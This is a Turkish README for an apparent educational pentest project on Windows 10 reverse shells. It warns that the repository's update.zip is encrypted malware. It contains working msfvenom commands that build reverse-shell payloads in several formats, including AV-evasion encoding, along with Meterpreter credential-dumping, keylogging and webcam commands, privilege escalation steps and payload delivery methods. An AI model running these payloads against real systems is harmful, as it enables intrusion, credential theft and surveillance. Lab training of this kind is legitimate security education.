<h1 align="center" style="color:red; font-size:48px;">DİKKAT !!!</h1>

<p style="color:red; font-size:16px; line-height:1.6;">

DEPO KISIMLARINDA BULUNAN <b>"update.zip"</b> DOSYASI GÜÇLÜ BİR ŞEKİLDE ŞİFRELENMİŞ BİR ZARARLI BİR YAZILIMDIR.  
HİÇ BİR ŞEKİLDE İNDİRMEYE VE ÇALIŞTIRMAYA ÇALIŞMAYIN.

<br><br>

BURADAKİ TÜM UYGULAMALARI KENDİ SANAL MAKİNELERİNİZDE ÇALIŞTIRIN.  
ŞAKA NİYETLİ BİLE OLSA BİR BAŞKASINA DENEMENİZ TAKDİRİNDE KVKK MADDELERİ GEREĞİNCE SUÇ İŞLEMİŞ OLURSUNUZ.

<br><br>

TÜM BUNLARI YAPMANIZ DAHİLİNDE TÜM SORUMLULUK YALNIZCA VE YALNIZCA SİZE AİTTİR.

</p>


# 🔐 Reverse Shell Study - Windows 10 Penetrasyon Testi Eğitim Projesi
> ⚠️ **UYARI**: Bu proje yalnızca eğitim amaçlıdır. Burada anlatılan teknikler sadece kendi kontrol ettiğiniz sistemlerde, izin alınmış penetrasyon testlerinde veya eğitim ortamlarında kullanılmalıdır. İzinsiz sistemlere saldırı yapmak yasa dışıdır ve ciddi hukuki sonuçlar doğurur.

## 📚 BÖLÜM 1: TEORİK VE EĞİTİCİ İÇERİK

### 1.1 Reverse Shell Nedir?

#### 1.1.1 Temel Kavram

**Reverse Shell** (Ters Kabuk), saldırgan bilgisayarın hedef sistemle bağlantı kurma yöntemlerinden biridir. Normal bir shell bağlantısından farkı, bağlantı yönünün tersine işlemesidir.

**Normal Shell (Bind Shell):**
```
Saldırgan → Bağlantı Talebi → Hedef Sistem (Port Dinliyor)
```

**Reverse Shell:**
```
Hedef Sistem → Bağlantı Talebi → Saldırgan (Port Dinliyor)
```

#### 1.1.2 Neden Reverse Shell Kullanılır?

1. **Firewall Bypass**: Çoğu firewall, dışarıdan gelen bağlantıları (inbound) engeller ama içeriden giden bağlantılara (outbound) izin verir
2. **NAT Geçişi**: NAT arkasındaki sistemlere erişim sağlar
3. **Tespit Zorluğu**: IDS/IPS sistemleri için normal çıkış trafiği gibi görünür
4. **Kolay Kurulum**: Hedef sistemde port açmaya gerek yoktur

#### 1.1.3 Reverse Shell Çalışma Mantığı

```
┌─────────────────┐                    ┌──────────────────┐
│  Saldırgan      │                    │  Hedef Sistem    │
│  (Kali Linux)   │                    │  (Windows 10)    │
├─────────────────┤                    ├──────────────────┤
│                 │                    │                  │
│ 1. Listener     │                    │ 2. Payload       │
│    Başlatılır   │                    │    Çalıştırılır  │
│    (Port: 4444) │                    │                  │
│                 │                    │                  │
│       ▼         │                    │        ▼         │
│                 │◄───────────────────┤                  │
│  3. Bağlantı    │   TCP Connection   │  3. Bağlantı     │
│     Kabul Edilir│                    │     Başlatılır   │
│                 │                    │                  │
│       ▼         │                    │        ▼         │
│                 │                    │                  │
│  4. Shell       │────────────────────►  4. Shell        │
│     Komutları   │   Komut & Yanıt    │     Çalışır      │
│                 │                    │                  │
└─────────────────┘                    └──────────────────┘
```

**Adımlar:**
1. **Listener Hazırlığı**: Saldırgan, kendi makinesinde belirli bir portta (genellikle 4444) dinleme (listening) başlatır
2. **Payload İletimi**: Hedef sisteme bir payload (zararlı kod) gönderilir veya çalıştırılır
3. **Geri Bağlantı**: Payload çalıştığında, hedef sistem saldırganın IP adresine ve portuna bağlantı başlatır
4. **Shell Erişimi**: Bağlantı kurulduğunda, saldırgan hedef sistemde komut çalıştırabilir

---

### 1.2 Metasploit Framework Nedir?

#### 1.2.1 Metasploit'in Tanımı

**Metasploit Framework**, dünyada en çok kullanılan açık kaynaklı penetrasyon testi platformudur. Rapid7 şirketi tarafından geliştirilmekte ve sürdürülmektedir.

**Temel Özellikler:**
- 2000'den fazla exploit modülü
- Binlerce payload seçeneği
- Modüler yapı
- Otomatik exploit geliştirme
- Post-exploitation araçları
- Kapsamlı veritabanı desteği

#### 1.2.2 Metasploit Mimarisi

```
┌─────────────────────────────────────────────────┐
│           METASPLOIT FRAMEWORK                  │
├─────────────────────────────────────────────────┤
│                                                 │
│  ┌──────────────┐  ┌──────────────┐            │
│  │   MSFconsole │  │   MSFvenom   │            │
│  │  (Ana Arayüz)│  │ (Payload Gen)│            │
│  └──────────────┘  └──────────────┘            │
│                                                 │
│  ┌──────────────────────────────────────────┐  │
│  │          CORE MODULES                    │  │
│  ├──────────────────────────────────────────┤  │
│  │  • Exploits  • Payloads  • Encoders     │  │
│  │  • NOPs      • Post      • Auxiliary    │  │
│  └──────────────────────────────────────────┘  │
│                                                 │
│  ┌──────────────────────────────────────────┐  │
│  │          LIBRARIES & TOOLS               │  │
│  ├──────────────────────────────────────────┤  │
│  │  • Rex      • Core      • Base           │  │
│  └──────────────────────────────────────────┘  │
│                                                 │
│  ┌──────────────────────────────────────────┐  │
│  │          DATABASE (PostgreSQL)           │  │
│  └──────────────────────────────────────────┘  │
│                                                 │
└─────────────────────────────────────────────────┘
```

#### 1.2.3 Metasploit Modül Türleri

**1. Exploits (İstismar Modülleri):**
- Hedef sistemdeki güvenlik açıklarını istismar eder
- Her exploit belirli bir zafiyet için tasarlanmıştır
- Örnek: `exploit/windows/smb/ms17_010_eternalblue`

**2. Payloads (Yükler):**
- Exploit başarılı olduktan sonra çalıştırılan kod
- Shell erişimi, dosya indirme, keylogger vb.
- Örnek: `windows/meterpreter/reverse_tcp`

**3. Auxiliary (Yardımcı Modüller):**
- Scanning, fuzzing, sniffing gibi işlemler
- Exploit içermez
- Örnek: `auxiliary/scanner/portscan/tcp`

**4. Encoders (Kodlayıcılar):**
- Payload'ları antivirüsten kaçırmak için şifreler
- Örnek: `x86/shikata_ga_nai`

**5. NOPs (No Operation):**
- Exploit güvenilirliğini artırmak için kullanılır
- Buffer overflow saldırılarında önemlidir

**6. Post (Post-Exploitation):**
- Sistem ele geçirildikten sonraki işlemler
- Privilege escalation, persistence, pivoting
- Örnek: `post/windows/gather/hashdump`

---

### 1.3 MSFconsole - Metasploit Konsolu

#### 1.3.1 MSFconsole Nedir?

**MSFconsole**, Metasploit Framework'ün en güçlü ve en çok kullanılan arayüzüdür. Terminal tabanlı, interaktif bir komut satırı arayüzüdür.

**Avantajları:**
- Tüm Metasploit özelliklerine tam erişim
- Tab completion desteği
- Komut geçmişi
- Scriptleme yetenekleri
- Database entegrasyonu
- Session yönetimi

#### 1.3.2 Temel MSFconsole Komutları

**Başlatma ve Yardım:**
```bash
msfconsole                    # MSFconsole'u başlat
help                          # Yardım menüsü
help [komut]                  # Belirli komut hakkında yardım
```

**Arama ve Seçim:**
```bash
search [terim]                # Modül ara
search type:exploit platform:windows
search cve:2017               # CVE numarasına göre ara
use [modül_adı]              # Modül seç
info                          # Seçili modül hakkında bilgi
```

**Modül Konfigürasyonu:**
```bash
show options                  # Modül seçeneklerini göster
show payloads                 # Uyumlu payload'ları göster
show targets                  # Hedef sistemleri göster
set [OPTION] [değer]         # Seçenek ayarla
setg [OPTION] [değer]        # Global seçenek ayarla
unset [OPTION]               # Seçeneği temizle
```

**Çalıştırma:**
```bash
exploit                       # Exploit'i çalıştır
run                          # Auxiliary modül çalıştır
exploit -j                   # Arka planda çalıştır
check                        # Sistemin savunmasız olup olmadığını kontrol et
```

**Session Yönetimi:**
```bash
sessions                      # Aktif session'ları listele
sessions -l                   # Detaylı session listesi
sessions -i [id]             # Session'a bağlan
sessions -k [id]             # Session'ı kapat
sessions -K                  # Tüm session'ları kapat
```

**Veritabanı:**
```bash
db_status                     # Veritabanı durumu
workspace                     # Workspace'leri listele
workspace -a [isim]          # Yeni workspace oluştur
hosts                        # Taranmış hostları göster
services                     # Bulunan servisleri göster
```

#### 1.3.3 MSFconsole İş Akışı

```
1. MSFconsole Başlat
   │
   ▼
2. Modül Ara (search)
   │
   ▼
3. Modül Seç (use)
   │
   ▼
4. Seçenekleri Görüntüle (show options)
   │
   ▼
5. Gerekli Parametreleri Ayarla (set)
   │
   ▼
6. Payload Seç (set payload)
   │
   ▼
7. Payload Seçeneklerini Ayarla
   │
   ▼
8. Exploit Çalıştır (exploit/run)
   │
   ▼
9. Shell/Meterpreter Erişimi
```

---

### 1.4 Payload Nedir?

#### 1.4.1 Payload Tanımı

**Payload**, exploit başarılı olduktan sonra hedef sistemde çalıştırılan kod parçasıdır. Payload, saldırganın hedef sistem üzerinde ne yapmak istediğini belirler.

**Payload Kategorileri:**

**1. Singles (Tek Aşamalı):**
- Tek bir dosyada tüm kod
- Küçük ve bağımsız
- Örnek: `windows/shell_reverse_tcp`

**2. Stagers (Aşamalı):**
- Küçük bir başlangıç kodu
- İkinci aşamayı indirir
- Örnek: `windows/meterpreter/reverse_tcp`

**3. Stages (İkinci Aşama):**
- Stager tarafından indirilen ana payload
- Daha büyük ve güçlü
- Örnek: `windows/meterpreter`

#### 1.4.2 Payload Türleri

**Shell Payloads:**
```
windows/shell/reverse_tcp          # Windows CMD shell (staged)
windows/shell_reverse_tcp          # Windows CMD shell (single)
linux/x86/shell/reverse_tcp        # Linux shell (staged)
```

**Meterpreter Payloads:**
```
windows/meterpreter/reverse_tcp    # Windows Meterpreter (staged)
windows/meterpreter_reverse_tcp    # Windows Meterpreter (single)
windows/x64/meterpreter/reverse_tcp # 64-bit Windows Meterpreter
```

**Execute Payloads:**
```
windows/exec                       # Komut çalıştır
windows/adduser                    # Kullanıcı ekle
```

#### 1.4.3 Meterpreter - Gelişmiş Payload

**Meterpreter**, Metasploit'in en gelişmiş payload'ıdır. DLL injection kullanarak hafızada çalışır ve disk üzerinde iz bırakmaz.

**Meterpreter Özellikleri:**
- Bellek içinde çalışma (disk yok)
- Şifreli iletişim
- Modüler yapı
- Kolay genişletilebilirlik
- Cross-platform desteği

**Temel Meterpreter Komutları:**

```bash
# Sistem Bilgisi
sysinfo                   # Sistem bilgilerini göster
getuid                    # Kullanıcı ID'sini al
ps                        # Çalışan işlemleri listele
getpid                    # Meterpreter işlem ID'si

# Dosya İşlemleri
pwd                       # Mevcut dizini göster
ls                        # Dosyaları listele
cd [dizin]               # Dizin değiştir
cat [dosya]              # Dosya içeriğini göster
download [dosya]         # Dosya indir
upload [dosya]           # Dosya yükle
edit [dosya]             # Dosya düzenle
search -f [dosya]        # Dosya ara

# Ağ İşlemleri
ipconfig                  # Ağ yapılandırmasını göster
route                     # Routing tablosunu göster
portfwd                   # Port yönlendirme
arp                       # ARP cache'i göster

# Güvenlik
hashdump                  # Password hash'lerini al
run post/windows/gather/hashdump
getsystem                 # SYSTEM yetkisi al

# Ekran ve Klavye
screenshot                # Ekran görüntüsü al
webcam_snap              # Webcam fotoğrafı çek
keyscan_start            # Keylogger başlat
keyscan_dump             # Kaydedilen tuşları göster
keyscan_stop             # Keylogger durdur

# Session Yönetimi
background               # Session'ı arka plana al
migrate [PID]            # Başka işleme geç
shell                    # CMD shell aç
exit                     # Meterpreter'dan çık
```

#### 1.4.4 Payload Parametreleri

**Önemli Payload Seçenekleri:**

```bash
LHOST (Local Host)        # Saldırgan IP adresi
LPORT (Local Port)        # Saldırgan dinleme portu
RHOST (Remote Host)       # Hedef IP adresi
RPORT (Remote Port)       # Hedef port numarası
```

**Örnek Konfigürasyon:**
```bash
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100      # Kali Linux IP
set LPORT 4444               # Dinleme portu
```

---

### 1.5 MSFvenom - Payload Üreteci

#### 1.5.1 MSFvenom Nedir?

**MSFvenom**, Metasploit Framework'e dahil olan standalone payload üretim aracıdır. MSFpayload ve MSFencode araçlarının birleştirilmiş halidir.

**Kullanım Alanları:**
- Çalıştırılabilir dosya üretimi (.exe, .elf, .apk)
- Script dosyaları (PHP, Python, PowerShell)
- Shellcode üretimi
- Encoder kullanımı

#### 1.5.2 MSFvenom Temel Kullanımı

**Komut Yapısı:**
```bash
msfvenom -p [PAYLOAD] [OPTIONS] -f [FORMAT] -o [OUTPUT]
```

**Önemli Parametreler:**
```bash
-p, --payload     # Payload seçimi
-l, --list        # Payloadları/encoderlari listele
-f, --format      # Çıktı formatı (exe, elf, raw, python, vb.)
-e, --encoder     # Encoder kullan
-i, --iterations  # Encode tekrar sayısı
-b, --bad-chars   # Kullanılmayacak karakterler
-o, --out         # Çıktı dosyası
-a, --arch        # Mimari (x86, x64)
--platform        # Platform (windows, linux)
-s, --space       # Maksimum payload boyutu
```

#### 1.5.3 MSFvenom Örnekleri

**Windows Reverse Shell EXE:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe \
  -o shell.exe
```

**Linux Reverse Shell ELF:**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf \
  -o shell.elf
```

**Encoded Windows Payload:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe \
  -o encoded_shell.exe
```

**PHP Web Shell:**
```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o shell.php
```

**Python Payload:**
```bash
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o shell.py
```

**Android APK:**
```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -o malicious.apk
```

**PowerShell One-Liner:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f psh \
  -o shell.ps1
```

#### 1.5.4 Payload Formatları

**Çalıştırılabilir Dosyalar:**
- `exe` - Windows executable
- `elf` - Linux executable
- `macho` - macOS executable
- `apk` - Android package

**Script Formatları:**
- `python` - Python script
- `php` - PHP script
- `aspx` - ASP.NET script
- `jsp` - Java Server Pages
- `war` - Java Web Archive

**Shellcode Formatları:**
- `c` - C array
- `python` - Python byte array
- `raw` - Raw shellcode
- `hex` - Hexadecimal
- `base64` - Base64 encoded

---

### 1.6 Exploit İş Akışı

#### 1.6.1 Penetrasyon Testi Aşamaları

```
1. RECONNAISSANCE (Keşif)
   │
   ├─ Passive Information Gathering
   └─ Active Information Gathering
   │
   ▼
2. SCANNING (Tarama)
   │
   ├─ Port Scanning (Nmap)
   ├─ Vulnerability Scanning
   └─ Service Enumeration
   │
   ▼
3. GAINING ACCESS (Erişim Sağlama)
   │
   ├─ Exploit Selection
   ├─ Payload Generation
   └─ Exploit Execution
   │
   ▼
4. MAINTAINING ACCESS (Erişimi Sürdürme)
   │
   ├─ Backdoor Installation
   ├─ Persistence Mechanisms
   └─ Rootkit Deployment
   │
   ▼
5. COVERING TRACKS (İz Silme)
   │
   ├─ Log Cleaning
   ├─ File Deletion
   └─ Timestamp Modification
```

#### 1.6.2 Bu Projede Kullanılan İş Akışı

```
Aşama 1: Ortam Hazırlığı
├─ Kali Linux VM Kurulumu
├─ Windows 10 VM Kurulumu
└─ Ağ Konfigürasyonu

Aşama 2: Payload Üretimi
├─ MSFvenom ile payload oluşturma
├─ Payload hedef sisteme transfer
└─ Payload'ı executable yapma

Aşama 3: Listener Başlatma
├─ MSFconsole açma
├─ Multi/handler modülü seçme
├─ Payload ve parametreleri ayarlama
└─ Exploit başlatma (listener)

Aşama 4: Payload Çalıştırma
├─ Hedef sistemde payload'ı çalıştır
├─ Reverse connection başlatılır
└─ Listener bağlantıyı yakalar

Aşama 5: Post-Exploitation
├─ Meterpreter session açılır
├─ Sistem bilgilerini toplama
├─ Privilege escalation
├─ Persistence kurma
└─ Lateral movement
```

---

### 1.7 Güvenlik Kavramları

#### 1.7.1 Firewall Bypass Teknikleri

**1. Reverse Shell:**
- Outbound bağlantı kullanır
- Çoğu firewall outbound'a izin verir
- Bu projede kullandığımız yöntem

**2. Port Seçimi:**
- HTTP (80) veya HTTPS (443) kullanımı
- DNS (53) tunelling
- Yaygın servis portları

**3. Payload Obfuscation:**
- Encoding kullanımı
- Polymorphic payloads
- Encryption

#### 1.7.2 Antivirus Evasion

**Statik Analiz Atlatma:**
- Encoder kullanımı (`-e`)
- Multiple iteration (`-i`)
- Custom templates
- Code obfuscation

**Dinamik Analiz Atlatma:**
- Sleep/delay ekleme
- Sandbox detection
- Anti-VM kontrolleri
- Process migration

**Örnek Encoded Payload:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=443 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe \
  -o evaded_shell.exe
```

#### 1.7.3 Privilege Escalation

**Windows Privilege Escalation Yöntemleri:**

1. **Kernel Exploits:**
   - OS sürümüne özel zafiyetler
   - `post/multi/recon/local_exploit_suggester`

2. **Misconfigured Services:**
   - Unquoted service paths
   - Weak service permissions
   - `windows/local/service_permissions`

3. **Registry Auto-Run:**
   - Auto-run key manipulation
   - Startup folder abuse

4. **Token Impersonation:**
   - `getsystem` komutu
   - Token stealing

**Meterpreter'da Privilege Escalation:**
```bash
# Mevcut yetkileri kontrol et
getuid

# SYSTEM yetkisi alma denemesi
getsystem

# Exploit önerisi al
run post/multi/recon/local_exploit_suggester

# Belirli bir exploit kullan
background
use exploit/windows/local/ms16_075_reflection
set SESSION 1
exploit
```

---

### 1.8 Network ve Protokol Bilgisi

#### 1.8.1 TCP/IP Temelleri

**TCP (Transmission Control Protocol):**
- Bağlantı odaklı
- Güvenilir veri iletimi
- 3-way handshake
- Reverse shell için ideal

**TCP 3-Way Handshake:**
```
Client                    Server
  │                          │
  │────SYN──────────────────►│  (1)
  │                          │
  │◄───SYN-ACK──────────────│  (2)
  │                          │
  │────ACK──────────────────►│  (3)
  │                          │
  │◄───Veri Alışverişi─────►│
```

**Port Numaraları:**
- 0-1023: Well-known ports (HTTP:80, HTTPS:443)
- 1024-49151: Registered ports
- 49152-65535: Dynamic/Private ports (Reverse shell için)

#### 1.8.2 Reverse Shell Network Akışı

```
Kali Linux (192.168.1.100:4444)      Windows 10 (192.168.1.105)
         │                                      │
         │ 1. nc -lvnp 4444                    │
         │    (Listener başlatıldı)            │
         │                                      │
         │                                      │ 2. payload.exe
         │                                      │    (Çalıştırıldı)
         │                                      │
         │◄─────3. TCP SYN─────────────────────│
         │       (Bağlantı isteği)             │
         │                                      │
         │──────4. TCP SYN-ACK─────────────────►│
         │                                      │
         │◄─────5. TCP ACK─────────────────────│
         │       (Bağlantı kuruldu)            │
         │                                      │
         │◄─────6. Shell Verisi───────────────►│
         │       (Komut & Yanıt)               │
```

---

### 1.9 Social Engineering ve Payload Delivery

#### 1.9.1 Payload İletim Yöntemleri

**1. E-posta Ekleri:**
- Executable dosyalar
- Office makroları
- Archive dosyaları (.zip, .rar)

**2. USB Saldırıları:**
- Autorun abuse
- BadUSB
- Rubber Ducky

**3. Web Tabanlı:**
- Drive-by download
- Malicious ads
- Watering hole attacks

**4. Fiziksel Erişim:**
- Direct execution
- Live USB boot
- BIOS manipulation

#### 1.9.2 Bu Projede: Eğitim Ortamı

Bu projede payload iletimi şu şekilde yapılır:
1. Payload Kali'de oluşturulur
2. Shared folder veya Python HTTP server ile paylaşılır
3. Windows VM'de manuel olarak indirilir ve çalıştırılır

**Örnek HTTP Server:**
```bash
# Kali Linux'ta
cd /path/to/payload
python3 -m http.server 8080

# Windows'ta tarayıcıdan
http://192.168.1.100:8080/payload.exe
```

---

### 1.10 Forensics ve Log Analizi

#### 1.10.1 Windows Olay Günlükleri

**Event Viewer Logları:**
- Security logs
- Application logs
- System logs

**Tespit Edilebilir İzler:**
- Process creation (Event ID 4688)
- Network connections (Event ID 5156)
- Logon events (Event ID 4624)

#### 1.10.2 Network Traffic Analizi

**Wireshark ile Tespit:**
```
Filtre: tcp.port == 4444
- SYN packets
- Şüpheli data transfer
- Outbound connections
```

---

## 📋 BÖLÜM 2: KURULUM VE UYGULAMA REHBERİ

### 2.1 Sistem Gereksinimleri

#### 2.1.1 Donanım Gereksinimleri

**Minimum Gereksinimler:**
- **CPU**: 2 core (4 önerilir)
- **RAM**: 4 GB (8 GB önerilir)
- **Disk**: 40 GB boş alan (SSD önerilir)
- **Network**: NAT veya Host-Only adapter

**Önerilen Sistem:**
- **CPU**: 4+ core (VT-x/AMD-V destekli)
- **RAM**: 16 GB
- **Disk**: 100+ GB SSD
- **Network**: Dual adapter (NAT + Host-Only)

#### 2.1.2 Yazılım Gereksinimleri

**Gerekli Yazılımlar:**
1. **Hypervisor** (Birini seçin):
   - VMware Workstation Pro/Player
   - VirtualBox (Ücretsiz)
   - Hyper-V (Windows Pro)

2. **Sanal Makineler**:
   - Kali Linux 2024.x ISO
   - Windows 10 ISO (Evaluation)

3. **İsteğe Bağlı**:
   - Wireshark (Traffic analizi)
   - Burp Suite (Web testing)

---

### 2.2 VirtualBox Kurulumu ve Konfigürasyonu

#### 2.2.1 VirtualBox Kurulumu

**Windows/macOS/Linux için:**

```bash
# Ubuntu/Debian için
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack

# Windows için
# virtualbox.org adresinden indirin ve kurulum wizard'ını izleyin
```

**Kurulum Adımları:**
1. VirtualBox'ı indirin: https://www.virtualbox.org/wiki/Downloads
2. İndirilen dosyayı çalıştırın
3. Varsayılan ayarlarla kurulumu tamamlayın
4. Extension Pack'i indirin ve kurun (USB, RDP desteği için)

#### 2.2.2 VirtualBox Network Ayarları

**Network Adapter Türleri:**

1. **NAT (Network Address Translation):**
   - VM'ler internete erişir
   - Dış dünyadan izole
   - VM'ler birbirini göremez

2. **NAT Network:**
   - VM'ler internete erişir
   - Aynı NAT network'teki VM'ler birbirini görür
   - **BU PROJENİN TERCİHİ**

3. **Host-Only Adapter:**
   - Sadece host ve VM'ler arası iletişim
   - İnternet erişimi yok

4. **Bridged Adapter:**
   - VM direkt fiziksel ağa bağlanır
   - Gerçek IP alır

**NAT Network Oluşturma:**

1. VirtualBox'ı açın
2. **File** → **Preferences** → **Network**
3. **NAT Networks** sekmesine gidin
4. Yeşil **+** butonuna tıklayın
5. Ayarları yapın:
   ```
   Network Name: PenTestLab
   Network CIDR: 192.168.100.0/24
   DHCP: Enabled
   ```
6. **OK** ile kaydedin

---

### 2.3 Kali Linux Sanal Makine Kurulumu

#### 2.3.1 Kali Linux İndirme

**Resmi Kaynak:**
```
URL: https://www.kali.org/get-kali/
```

**Seçenekler:**
1. **Pre-built VirtualBox Image** (Önerilir - Hızlı kurulum)
   - Dosya: `kali-linux-2024.x-virtualbox-amd64.7z`
   - Boyut: ~3.5 GB

2. **Installer ISO** (Manuel kurulum)
   - Dosya: `kali-linux-2024.x-installer-amd64.iso`
   - Boyut: ~4 GB

**İndirme:**
```bash
# wget ile indirme
wget https://cdimage.kali.org/kali-2024.x/kali-linux-2024.x-installer-amd64.iso

# Torrent ile (Daha hızlı)
# .torrent dosyasını indirin ve torrent client ile açın
```

#### 2.3.2 Pre-built Image ile Kurulum (Hızlı Yol)

**Adım 1: Image'ı Ayıklama**
```bash
# 7z gereklidir
# Windows: 7-Zip ile sağ tık → Extract
# Linux:
sudo apt install p7zip-full
7z x kali-linux-2024.x-virtualbox-amd64.7z
```

**Adım 2: VirtualBox'a Import Etme**
1. VirtualBox'ı açın
2. **File** → **Import Appliance**
3. Ayıklanan `.vbox` dosyasını seçin
4. **Next** → Ayarları inceleyin
5. **Import** tıklayın (5-10 dakika)

**Adım 3: VM Ayarlarını Düzenleme**
1. VM'i sağ tık → **Settings**
2. **System** → **Motherboard**:
   - Base Memory: 2048 MB (4096 önerilir)
3. **System** → **Processor**:
   - Processor(s): 2 (4 önerilir)
4. **Display**:
   - Video Memory: 128 MB
5. **Network** → **Adapter 1**:
   - Attached to: **NAT Network**
   - Name: **PenTestLab**
6. **OK** ile kaydet

**Adım 4: İlk Başlatma**
1. VM'i seçin ve **Start**
2. Varsayılan Credentials:
   ```
   Username: kali
   Password: kali
   ```

#### 2.3.3 ISO ile Manuel Kurulum (Detaylı Yol)

**Adım 1: Yeni VM Oluşturma**
1. VirtualBox'ta **New** tıklayın
2. Ayarlar:
   ```
   Name: Kali Linux
   Type: Linux
   Version: Debian (64-bit)
   Memory: 2048 MB
   Hard Disk: Create a virtual hard disk now
   ```
3. **Create** tıklayın

**Adım 2: Hard Disk Ayarları**
```
File size: 40 GB (80 GB önerilir)
Hard disk file type: VDI
Storage: Dynamically allocated
```

**Adım 3: VM Settings**
1. VM'i sağ tık → **Settings**
2. **Storage**:
   - Controller: IDE → Empty → Disk icon → **Choose a disk file**
   - Kali ISO dosyasını seçin
3. **Network**:
   - Adapter 1: **NAT Network** (PenTestLab)
4. **OK**

**Adım 4: Kurulum**
1. VM'i **Start**
2. Boot menüsünde **Graphical Install** seçin
3. Dil: **English**
4. Location: **United States** (veya kendi ülkeniz)
5. Keyboard: **American English** (veya Türkçe Q)
6. Hostname: `kali`
7. Domain: `local` (boş bırakılabilir)
8. Full name: `Kali User`
9. Username: `kali`
10. Password: `kali` (veya güçlü bir şifre)
11. Timezone: (Otomatik seçilir)
12. Partition: **Guided - use entire disk**
13. Disk: `/dev/sda`
14. Partition scheme: **All files in one partition**
15. **Finish partitioning**
16. **Yes** - Write changes
17. Software selection:
    - **Kali Linux Desktop (Xfce)** ✓
    - **Default metapackage** ✓
    - **Large metapackage** (opsiyonel)
18. GRUB bootloader: **Yes** → `/dev/sda`
19. **Continue** - Kurulum tamamlandı

**Adım 5: İlk Boot ve Güncellemeler**
```bash
# Login yapın (kali/kali)

# Sistemi güncelleyin
sudo apt update
sudo apt full-upgrade -y

# Metasploit güncellemesi
sudo msfupdate

# Sistem yeniden başlatma
sudo reboot
```

#### 2.3.4 Kali Linux İlk Yapılandırma

**Network Kontrolü:**
```bash
# IP adresinizi kontrol edin
ip addr show

# Ping testi
ping -c 4 google.com

# DNS testi
nslookup google.com
```

**Metasploit Veritabanı Başlatma:**
```bash
# PostgreSQL başlatma
sudo systemctl start postgresql

# Metasploit veritabanı oluşturma
sudo msfdb init

# Durumu kontrol etme
sudo msfdb status

# MSFconsole'da kontrol
msfconsole
msf6 > db_status
```

**SSH Sunucusu Kurulumu (İsteğe Bağlı):**
```bash
# SSH kurulumu
sudo apt install openssh-server -y

# SSH başlatma
sudo systemctl start ssh

# Otomatik başlatma
sudo systemctl enable ssh

# SSH durumu
sudo systemctl status ssh
```

**Faydalı Araçlar:**
```bash
# Ek araçlar kurulumu
sudo apt install -y \
  terminator \
  vim \
  git \
  python3-pip \
  net-tools \
  nmap \
  wireshark \
  burpsuite
```

---

### 2.4 Windows 10 Sanal Makine Kurulumu

#### 2.4.1 Windows 10 ISO İndirme

**Resmi Microsoft Kaynağı:**
```
URL: https://www.microsoft.com/en-us/software-download/windows10ISO
```

**Evaluation Sürümü (90 Gün Ücretsiz):**
```
URL: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise
```

**Not:** Evaluation sürümü 90 gün tam özellikli çalışır ve test için idealdir.

#### 2.4.2 Windows 10 VM Oluşturma

**Adım 1: Yeni VM Oluşturma**
1. VirtualBox → **New**
2. Ayarlar:
   ```
   Name: Windows 10 Target
   Type: Microsoft Windows
   Version: Windows 10 (64-bit)
   Memory: 4096 MB (minimum 2048 MB)
   Hard Disk: Create a virtual hard disk now
   ```

**Adım 2: Virtual Hard Disk**
```
File size: 60 GB
Hard disk file type: VDI
Storage: Dynamically allocated
```

**Adım 3: VM Settings**
1. **System** → **Motherboard**:
   - Boot Order: Optical, Hard Disk
   - Chipset: ICH9
   - Extended Features: **Enable EFI** (Uncheck)

2. **System** → **Processor**:
   - Processor(s): 2 (4 önerilir)
   - Extended Features: **Enable PAE/NX**

3. **Display**:
   - Video Memory: 128 MB
   - Graphics Controller: VBoxVGA
   - Acceleration: **Enable 3D**

4. **Storage**:
   - Controller: IDE → Empty → Disk Icon
   - Choose Windows 10 ISO

5. **Network** → **Adapter 1**:
   - Attached to: **NAT Network**
   - Name: **PenTestLab**

6. **USB**:
   - USB 3.0 Controller (gerekirse)

#### 2.4.3 Windows 10 Kurulumu

**Adım 1: VM Başlatma ve Kurulum**
1. VM'i **Start**
2. ISO'dan boot olacak
3. **Press any key to boot from CD or DVD**
4. Kurulum Wizard:
   ```
   Language: English
   Time: (Varsayılan)
   Keyboard: US (veya Turkish Q)
   ```
5. **Install Now**
6. **I don't have a product key** (Evaluation için)
7. Windows sürümü: **Windows 10 Pro** (veya Enterprise)
8. Accept license terms
9. Installation type: **Custom**
10. Disk selection: **Unallocated Space** → **Next**

**Adım 2: İlk Yapılandırma**
1. Region: **Turkey** (veya kendi ülkeniz)
2. Keyboard: **Turkish Q** (veya US)
3. Second keyboard: **Skip**
4. Network: **I don't have internet** (çevrimdışı kurulum için)
5. **Continue with limited setup**
6. Username: `testuser` (veya istediğiniz isim)
7. Password: `password` (veya boş bırakın)
8. Security questions: (Yanıtlayın)
9. Privacy settings: Hepsini **No** yapabilirsiniz
10. Cortana: **Not now**

**Adım 3: Windows Güncellemeleri**
```powershell
# Settings → Update & Security → Windows Update
# "Check for updates" tıklayın
# Tüm güncellemeleri yükleyin ve restart edin
```

#### 2.4.4 Guest Additions Kurulumu

**VirtualBox Guest Additions** kurulumu performans ve entegrasyon için önemlidir.

**Kurulum Adımları:**
1. Windows VM çalışırken
2. VirtualBox menüsü: **Devices** → **Insert Guest Additions CD image**
3. Windows'ta AutoPlay açılırsa: **Run VBoxWindowsAdditions.exe**
4. Manuel: `This PC` → `CD Drive (D:)` → `VBoxWindowsAdditions.exe` çalıştır
5. Kurulum wizard'ını takip edin
6. **Reboot now** seçin

**Faydaları:**
- Paylaşımlı klasörler
- Clipboard paylaşımı
